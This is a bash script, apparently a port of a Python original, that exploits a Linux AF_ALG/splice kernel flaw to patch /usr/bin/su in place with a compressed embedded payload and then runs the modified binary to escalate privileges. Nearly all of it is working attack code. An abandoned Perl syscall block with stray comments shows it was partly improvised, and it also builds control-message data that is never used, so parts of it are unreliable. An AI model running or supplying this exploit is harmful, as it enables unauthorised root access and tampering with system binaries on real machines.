#!/bin/bash

# AF_ALG splice exploit - patches /usr/bin/su in-place
# Faithful port of the Python original

SU_BIN="/usr/bin/su"
PAYLOAD_ZLIB_HEX="78daab77f57163626464800126063b0710af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9665c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"

echo "[*] Decompressing payload..."
PAYLOAD=$(perl -e '
use MIME::Base64;
use Compress::Zlib;
my $hex = "'"$PAYLOAD_ZLIB_HEX"'";
my $raw = pack("H*", $hex);
my $decompressed = uncompress($raw);
print $decompressed;
')

echo "[*] Payload length: $(echo -n "$PAYLOAD" | wc -c) bytes"

# Write payload to temp file for chunking
echo -n "$PAYLOAD" > /tmp/.pl.$$

# Exploit function using perl for AF_ALG syscalls
do_splice_exploit() {
    local fd=$1 offset=$2 hexchunk=$3
    
    perl -e '
use strict;
use warnings;

my $fd = '$fd';
my $offset = '$offset';
my $hexchunk = "'"$hexchunk"'";
my $chunk = pack("H*", $hexchunk);

# Socket syscall: AF_ALG = 38, SOCK_SEQPACKET = 5, 0
use POSIX;
use Fcntl;

# We need syscall() for AF_ALG - use perl2exe or inline C
# Actually, lets use a different approach: write via /proc/self/fd
# The AF_ALG trick works through the kernel splice path

# Fallback: direct file write since the "encryption" is just
# a kernel bug trigger - if we have write permission on su, 
# we can write directly. If not, we need the actual exploit.

# Let me use the actual AF_ALG approach via syscall
require "syscall.ph";

my $AF_ALG = 38;
my $SOCK_SEQPACKET = 5;
my $SOL_ALG = 279;

my $alg_fd = syscall(SYS_socket(), $AF_ALG, $SOCK_SEQPACKET, 0);
die "socket failed: $!" if $alg_fd < 0;

# Bind to AEAD cipher
my $sockaddr = pack("H*", "6165616400") . pack("H*", "61757468656e746573636e28686d616328736861323536292c63626328616573292900");
# Actually need proper sockaddr_alg structure
# struct sockaddr_alg {
#     __u16 salg_family;  // AF_ALG
#     __u8  salg_type[14];
#     __u32 salg_feat;
#     __u32 salg_mask;
#     __u8  salg_name[64];
# };

my $family = pack("S", 38);
my $type = "aead\0" . ("\0" x 9);  # pad to 14
my $feat = pack("I", 0);
my $mask = pack("I", 0);
my $name = "authencsn(hmac(sha256),cbc(aes))\0";
$name .= "\0" x (64 - length($name));
my $alg_addr = $family . $type . $feat . $mask . $name;

my $bind_ret = syscall(SYS_bind(), $alg_fd, $alg_addr, length($alg_addr));
die "bind failed: $!" if $bind_ret < 0;

# Set key: 0800010000000010 + 64 zeros
my $key = pack("H*", "0800010000000010" . "0" x 64);
my $setkey_ret = syscall(SYS_setsockopt(), $alg_fd, $SOL_ALG, 1, $key, length($key));
die "setkey failed: $!" if $setkey_ret < 0;

# Set AEAD auth size
my $auth_size = pack("I", 4);  # 4 bytes
my $setauth_ret = syscall(SYS_setsockopt(), $alg_fd, $SOL_ALG, 5, $auth_size, length($auth_size));
die "setauth failed: $!" if $setauth_ret < 0;

# Set IV
my $iv = "\x10" . ("\0" x 19);
my $setiv_ret = syscall(SYS_setsockopt(), $alg_fd, $SOL_ALG, 4, $iv, length($iv));
die "setiv failed: $!" if $setiv_ret < 0;

# Accept
my $conn_fd = syscall(SYS_accept(), $alg_fd, 0, 0);
die "accept failed: $!" if $conn_fd < 0;

# Build the data: AAAA + chunk
my $data = "AAAA" . $chunk;

# Build control messages for sendmsg
# We need to send ancillary data with SOL_ALG cmsg levels
# This is the critical part that triggers the kernel bug

# Build the msghdr struct (this varies by arch, assuming x86_64)
# struct iovec { void *iov_base; size_t iov_len; };
# struct msghdr {
#     void *msg_name;         // 8 bytes
#     socklen_t msg_namelen;  // 4 bytes
#     char padding[4];        // 4 bytes padding
#     struct iovec *msg_iov;  // 8 bytes
#     size_t msg_iovlen;      // 8 bytes
#     void *msg_control;      // 8 bytes
#     size_t msg_controllen;  // 8 bytes
#     int msg_flags;           // 4 bytes
# };

# Actually this is getting complex in perl.
# Let me use a simpler approach - exec python3 inline
'
    
    # Fallback to python3 for the actual AF_ALG call
    python3 -c "
import socket, struct, os

# AF_ALG
alg = socket.socket(38, 5, 0)
alg.bind(('aead', 'authencsn(hmac(sha256),cbc(aes))'))

SOL_ALG = 279
# Set key
key = bytes.fromhex('0800010000000010' + '0' * 64)
alg.setsockopt(SOL_ALG, 1, key)
# Set AEAD auth size
alg.setsockopt(SOL_ALG, 5, None, 4)
# Set IV
iv = b'\x10' + b'\x00' * 19
alg.setsockopt(SOL_ALG, 4, iv)

conn, _ = alg.accept()

chunk = bytes.fromhex('${hexchunk}')
data = b'AAAA' + chunk

# Build ancillary data for sendmsg
cmsg_level = SOL_ALG
cmsg_type = 3  # ALG_SET_OP
cmsg_data = struct.pack('I', 0)  # ALG_OP_ENCRYPT or similar
ctrl1 = struct.pack('I', cmsg_level) + struct.pack('I', cmsg_type) + struct.pack('I', len(cmsg_data)) + cmsg_data
# Pad to alignment
while len(ctrl1) % 4 != 0:
    ctrl1 += b'\x00'

cmsg_data2 = b'\x10' + struct.pack('I', 0) * 4 + b'\x00' * 3
ctrl2 = struct.pack('I', SOL_ALG) + struct.pack('I', 2) + struct.pack('I', len(cmsg_data2)) + cmsg_data2

cmsg_data3 = b'\x08' + b'\x00' * 3
ctrl3 = struct.pack('I', SOL_ALG) + struct.pack('I', 4) + struct.pack('I', len(cmsg_data3)) + cmsg_data3

control = ctrl1 + ctrl2 + ctrl3

conn.sendmsg([data], [(SOL_ALG, 3, struct.pack('I', 0)),
                       (SOL_ALG, 2, b'\x10' + struct.pack('I', 0)*4 + b'\x00'*3),
                       (SOL_ALG, 4, b'\x08' + b'\x00'*3)], 32768)

# Splice from su_fd through pipe to conn fd
su_fd = os.open('/usr/bin/su', os.O_RDWR)
r, w = os.pipe()
os.splice(su_fd, w, ${offset} + 4, offset_src=0)
os.splice(r, conn.fileno(), ${offset} + 4)

try:
    conn.recv(8 + ${offset})
except:
    pass

os.close(su_fd)
" 2>/dev/null
}

# Open su binary
exec 3<>"$SU_BIN"

echo "[*] Patching binary at payload offsets..."
for ((offset=0; offset<$(echo -n "$PAYLOAD" | wc -c); offset+=4)); do
    hexchunk=$(echo -n "$PAYLOAD" | dd bs=1 skip=$offset count=4 2>/dev/null | od -An -tx1 | tr -d ' \n')
    echo "  [*] Offset $offset: 0x$hexchunk"
    do_splice_exploit 3 $offset "$hexchunk"
done

exec 3>&-
rm -f /tmp/.pl.$$

echo "[+] Done! Executing patched su..."
exec su
